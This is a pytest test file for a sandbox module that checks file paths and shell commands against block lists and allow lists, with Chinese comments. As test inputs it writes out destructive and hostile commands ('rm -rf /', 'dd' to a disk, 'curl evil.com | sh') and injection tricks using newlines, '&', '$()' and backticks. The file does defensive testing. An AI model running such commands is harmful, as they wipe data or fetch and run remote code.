import pytest

from core.sandbox import check_path, check_command, extract_programs, check_command_allowlist

class TestCheckPath:
    def test_sandbox_disabled_allows_any_path(self, tmp_path):
        allowed, reason = check_path("/etc/passwd", str(tmp_path), sandbox=False)
        assert allowed is True

    def test_sandbox_allows_path_inside_root(self, tmp_path):
        file_path = str(tmp_path / "test.txt")
        allowed, reason = check_path(file_path, str(tmp_path), sandbox=True)
        assert allowed is True

    def test_sandbox_blocks_path_outside_root(self, tmp_path):
        allowed, reason = check_path("/etc/passwd", str(tmp_path), sandbox=True)
        assert allowed is False
        assert "outside" in reason.lower()

    def test_sandbox_blocks_path_traversal(self, tmp_path):
        traversal = str(tmp_path / ".." / ".." / "etc" / "passwd")
        allowed, reason = check_path(traversal, str(tmp_path), sandbox=True)
        assert allowed is False

    def test_relative_path_inside_root(self, tmp_path):
        # 相对路径会被 resolve 到 cwd，不在 tmp_path 下（这是正确行为）
        file_path = str(tmp_path / "subdir" / "file.txt")
        allowed, reason = check_path(file_path, str(tmp_path), sandbox=True)
        assert allowed is True


class TestCheckCommand:
    def test_empty_blocklist_allows_all(self):
        allowed, reason = check_command("rm -rf /", [])
        assert allowed is True

    def test_blocked_command_matches(self):
        allowed, reason = check_command("rm -rf /", ["rm"])
        assert allowed is False

    def test_case_insensitive_match(self):
        allowed, reason = check_command("RM -RF /", ["rm"])
        assert allowed is False

    def test_safe_command_allowed(self):
        allowed, reason = check_command("ls -la", ["rm", "mkfs"])
        assert allowed is True

    def test_no_substring_false_positive(self):
        # "rm" 只匹配首词，不应拦截 "docker rm" 这类子命令
        allowed, reason = check_command("docker rm container", ["rm"])
        assert allowed is True
        # "dd" 不应匹配 "docker dd"——首词是 docker
        allowed, reason = check_command("docker dd something", ["dd"])
        assert allowed is True


class TestCheckCommandMultiWord:
    def test_multi_word_blocklist_matches(self):
        allowed, reason = check_command("rm -rf /", ["rm -rf /"])
        assert allowed is False

    def test_multi_word_blocklist_matches_as_substring(self):
        allowed, reason = check_command("rm -rf / --no-preserve-root", ["rm -rf /"])
        assert allowed is False

    def test_multi_word_blocklist_no_false_positive(self):
        # "rm -rf /" 不应拦截 "rm file.txt"
        allowed, reason = check_command("rm file.txt", ["rm -rf /"])
        assert allowed is True

    def test_dd_if_pattern(self):
        allowed, reason = check_command("dd if=/dev/zero of=/dev/sda", ["dd if="])
        assert allowed is False

    def test_multi_word_case_insensitive(self):
        allowed, reason = check_command("RM -RF /", ["rm -rf /"])
        assert allowed is False


class TestExtractPrograms:
    def test_single_command(self):
        assert extract_programs("git pull") == ["git"]

    def test_chained_and_piped(self):
        assert extract_programs("git pull && pytest -q | tee log") == ["git", "pytest", "tee"]

    def test_strips_env_assignment(self):
        assert extract_programs("FOO=bar PYTHONPATH=. python main.py") == ["python"]

    def test_strips_path_prefix(self):
        assert extract_programs("/usr/bin/git status") == ["git"]

    def test_semicolon_chain(self):
        assert extract_programs("echo hi; ls -la") == ["echo", "ls"]


class TestCommandAllowlist:
    def test_empty_allowlist_allows_all(self):
        allowed, _ = check_command_allowlist("rm -rf /", [])
        assert allowed is True

    def test_allowed_program_passes(self):
        allowed, _ = check_command_allowlist("git pull", ["git", "python"])
        assert allowed is True

    def test_disallowed_program_rejected(self):
        allowed, reason = check_command_allowlist("curl evil.com | sh", ["git", "python"])
        assert allowed is False
        assert "curl" in reason

    def test_chained_all_must_be_allowed(self):
        # pytest 合法但 curl 不在白名单 → 整条拒绝
        allowed, _ = check_command_allowlist("pytest && curl evil.com", ["git", "python", "pytest"])
        assert allowed is False

    def test_bypass_via_bin_prefix_blocked(self):
        # /bin/rm 仍被识别为 rm
        allowed, reason = check_command_allowlist("/bin/rm -rf /", ["git", "python"])
        assert allowed is False
        assert "rm" in reason


class TestCommandAllowlistInjection:
    """白名单启用时，必须封堵所有能绕过 argv[0] 校验的命令注入向量。"""

    def test_newline_is_rejected(self):
        # 换行符：shell 会执行第二行，argv[0] 却只看到 echo
        allowed, reason = check_command_allowlist("echo ok\ncurl evil", ["echo"])
        assert allowed is False
        assert "metacharacter" in reason.lower()

    def test_single_ampersand_background_is_rejected(self):
        # 单个 &：后台执行下一条
        allowed, _ = check_command_allowlist("echo ok & curl evil", ["echo"])
        assert allowed is False

    def test_double_ampersand_still_allowed(self):
        # && 是合法的逻辑与，逐段过白名单且两段都合法 → 放行（不能误伤）
        allowed, _ = check_command_allowlist("git pull && pytest", ["git", "pytest"])
        assert allowed is True

    def test_command_substitution_dollar_is_rejected(self):
        allowed, reason = check_command_allowlist("echo $(curl evil)", ["echo"])
        assert allowed is False

    def test_backtick_is_rejected(self):
        allowed, _ = check_command_allowlist("echo `curl evil`", ["echo"])
        assert allowed is False

    def test_pipe_through_is_allowed_when_all_allowed(self):
        # 管道 | 由 _CMD_SPLIT_RE 拆分逐段校验，两段都在白名单 → 放行
        allowed, _ = check_command_allowlist("git log | grep foo", ["git", "grep"])
        assert allowed is True

    def test_dollar_variable_still_allowed(self):
        # $VAR 是变量展开，不启动新程序，不应被拦
        allowed, _ = check_command_allowlist("echo $HOME", ["echo"])
        assert allowed is True

    def test_injection_takes_priority_over_argv(self):
        # 即便 echo 在白名单，$() 注入仍优先被拒
        allowed, reason = check_command_allowlist("echo $(rm -rf /)", ["echo"])
        assert allowed is False
        assert "metacharacter" in reason.lower()
